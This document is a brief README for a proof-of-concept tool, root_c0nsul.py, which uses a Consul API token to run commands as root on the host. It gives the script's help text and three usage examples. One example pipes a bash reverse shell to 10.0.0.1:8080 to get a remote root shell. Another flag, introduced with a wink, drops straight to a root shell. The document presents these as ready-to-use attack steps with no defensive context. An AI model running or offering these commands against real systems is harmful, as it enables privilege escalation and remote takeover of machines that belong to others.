
- taking advantage of the consul api token to task commands to run as root


```
$ python3 root_c0nsul.py -h

usage: root_c0nsul.py [-h] --api_token API_TOKEN [--command COMMAND] [--root]

options:
  -h, --help            show this help message and exit
  --api_token API_TOKEN, -t API_TOKEN
                        the api token of the consul service
  --command COMMAND, -c COMMAND
                        command to be executed as root
  --root                get root shell ;)

poc for exploiting the consul service api to gain root privs
```

example1: `$ python3 root_c0nsul.py -t <API_TOKEN> -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"` get a root revshell

example2: `$ python3 root_c0nsul.py -t <API_TOKEN> -c "id"` executes the command (id) as root

example3: `$ python3 root_c0nsul.py -t <API_TOKEN> --root` you know what does that do ;) 


